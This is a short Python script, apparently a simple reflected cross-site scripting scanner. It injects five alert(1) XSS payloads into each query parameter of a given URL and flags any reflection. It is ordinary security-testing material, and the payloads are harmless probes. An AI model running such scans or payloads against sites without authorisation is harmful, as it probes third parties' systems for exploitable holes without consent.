import argparse
import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import sys

def test_xss(url, payloads):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print(f"[!] No parameters found in URL: {url}")
        return

    print(f"[*] Testing {len(params)} parameters with {len(payloads)} payloads each...")

    results = []
    for param in params:
        for payload in payloads:
            # Create a copy of params and inject payload
            test_params = params.copy()
            test_params[param] = [payload]
            
            # Reconstruct URL
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            try:
                print(f"[*] Testing parameter '{param}' with payload: {payload}")
                response = requests.get(test_url, timeout=10)
                
                if payload in response.text:
                    print(f"[+] Possible XSS found in parameter '{param}'!")
                    print(f"[+] URL: {test_url}")
                    results.append({
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "status": "Reflected"
                    })
            except Exception as e:
                print(f"[!] Error testing {test_url}: {e}")

    return results

def main():
    parser = argparse.ArgumentParser(description="Simple XSS Scanner")
    parser.add_argument("--url", required=True, help="Target URL to scan")
    args = parser.parse_args()

    # Basic payloads
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]

    results = test_xss(args.url, payloads)
    
    if results:
        print("\n[SUMMARY] Found reflections:")
        for r in results:
            print(f"- Param: {r['parameter']}, Payload: {r['payload']}")
    else:
        print("\n[!] No reflections found.")

if __name__ == "__main__":
    main()
